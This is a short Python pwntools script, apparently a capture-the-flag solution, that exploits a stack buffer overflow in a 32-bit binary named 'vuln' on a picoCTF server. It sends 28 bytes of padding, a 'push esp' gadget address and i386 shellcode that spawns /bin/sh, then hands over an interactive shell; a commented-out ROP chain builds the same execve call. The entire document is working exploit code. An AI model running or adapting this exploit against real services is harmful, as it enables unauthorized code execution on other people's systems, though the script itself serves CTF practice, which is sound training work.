from pwn import *

context.arch = 'i386'

elf = ELF("./vuln")
p = remote("saturn.picoctf.net", 54773)
#p = process("./vuln")
#p = gdb.debug("./vuln", "b vuln\n c\n")

rop = ROP(elf)
push_esp = p32(0x080b075a)
pop_eax = 0x080b074a
#push_esp = 0x080b075a
pop_edi = 0x0804b28f
pop_esi = 0x0804ae7a
syscall = 0x0806418d
'''
rop.raw(pop_eax)
rop.raw(11)
rop.raw(push_esp)
rop.raw("/bin/sh\0")
rop.raw(pop_edi)
rop.raw(pop_esi)
rop.raw(pop_esi)
rop.raw(pop_esi)
rop.raw(0)
rop.raw(syscall)
'''

p.sendline(b'A'*(28) + push_esp + asm(shellcraft.i386.linux.sh()))
p.interactive()
